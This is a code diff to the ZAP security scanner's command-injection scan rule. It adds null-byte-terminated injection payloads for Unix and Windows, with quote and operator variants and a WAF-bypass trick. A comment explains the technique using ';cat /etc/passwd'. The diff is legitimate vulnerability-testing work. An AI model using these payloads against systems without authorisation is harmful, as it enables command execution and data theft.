@@ -19,6 +19,8 @@
  */
 package org.zaproxy.zap.extension.ascanrules;
 
+import static org.zaproxy.zap.extension.ascanrules.utils.Constants.NULL_BYTE_CHARACTER;
+
 import java.io.IOException;
 import java.net.SocketException;
 import java.util.ArrayList;
@@ -134,6 +136,64 @@ public class CommandInjectionPlugin extends AbstractAppParamPlugin {
         // Used for *nix
         // OS_PAYLOADS.put("\"|\"ld", null);
         // OS_PAYLOADS.put("'|'ld", null);
+
+        /**
+         * Null Byte Payloads. Say NIX OS is there and original input is "image". Now Vulnerable
+         * application is executing command as "cat" + <input value>+ ".jpeg". If ZAP payload is
+         * ";cat /etc/passwd" then the final value passed to Vulnerable application is "image;cat
+         * /etc/passwd" and Command executed by application is "cat image;cat /etc/passwd.jpeg" and
+         * it will not succeed but if we add null byte to the payload then command executed by
+         * application will be "cat image;cat /etc/passwd\0.jpeg" and hence .jpeg will be ignored
+         * and attack will succeed. Here we are not adding null byte before the payload i.e.
+         * "image\0;cat /etc/passwd" reason is then the underline C/C++ utility stops execution as
+         * it finds null byte. More information:
+         * http://projects.webappsec.org/w/page/13246949/Null%20Byte%20Injection
+         */
+        // No quote payloads
+        NIX_OS_PAYLOADS.put(";" + NIX_TEST_CMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
+        NIX_OS_PAYLOADS.put("&" + NIX_TEST_CMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
+
+        WIN_OS_PAYLOADS.put("&" + WIN_TEST_CMD + NULL_BYTE_CHARACTER, WIN_CTRL_PATTERN);
+        WIN_OS_PAYLOADS.put("|" + WIN_TEST_CMD + NULL_BYTE_CHARACTER, WIN_CTRL_PATTERN);
+
+        // Double quote payloads
+        NIX_OS_PAYLOADS.put("\"&" + NIX_TEST_CMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
+        NIX_OS_PAYLOADS.put("\";" + NIX_TEST_CMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
+
+        WIN_OS_PAYLOADS.put("\"&" + WIN_TEST_CMD + NULL_BYTE_CHARACTER, WIN_CTRL_PATTERN);
+        WIN_OS_PAYLOADS.put("\"|" + WIN_TEST_CMD + NULL_BYTE_CHARACTER, WIN_CTRL_PATTERN);
+
+        // Single quote payloads
+        NIX_OS_PAYLOADS.put("'&" + NIX_TEST_CMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
+        NIX_OS_PAYLOADS.put("';" + NIX_TEST_CMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
+
+        WIN_OS_PAYLOADS.put("'&" + WIN_TEST_CMD + NULL_BYTE_CHARACTER, WIN_CTRL_PATTERN);
+        WIN_OS_PAYLOADS.put("'|" + WIN_TEST_CMD + NULL_BYTE_CHARACTER, WIN_CTRL_PATTERN);
+
+        // Special payloads
+        NIX_OS_PAYLOADS.put(
+                "||" + NIX_TEST_CMD + NULL_BYTE_CHARACTER,
+                NIX_CTRL_PATTERN); // or control concatenation
+        NIX_OS_PAYLOADS.put(
+                "&&" + NIX_TEST_CMD + NULL_BYTE_CHARACTER,
+                NIX_CTRL_PATTERN); // and control concatenation
+        // FoxPro for running os commands
+        WIN_OS_PAYLOADS.put("run " + WIN_TEST_CMD + NULL_BYTE_CHARACTER, WIN_CTRL_PATTERN);
+
+        // uninitialized variable waf bypass
+        insertedCMD = insertUninitVar(NIX_TEST_CMD);
+        // No quote payloads
+        NIX_OS_PAYLOADS.put("&" + insertedCMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
+        NIX_OS_PAYLOADS.put(";" + insertedCMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
+        // Double quote payloads
+        NIX_OS_PAYLOADS.put("\"&" + insertedCMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
+        NIX_OS_PAYLOADS.put("\";" + insertedCMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
+        // Single quote payloads
+        NIX_OS_PAYLOADS.put("'&" + insertedCMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
+        NIX_OS_PAYLOADS.put("';" + insertedCMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
+        // Special payloads
+        NIX_OS_PAYLOADS.put("||" + insertedCMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
+        NIX_OS_PAYLOADS.put("&&" + insertedCMD + NULL_BYTE_CHARACTER, NIX_CTRL_PATTERN);
     };
 
     // Coefficient used for a time-based query delay checking (must be >= 7)
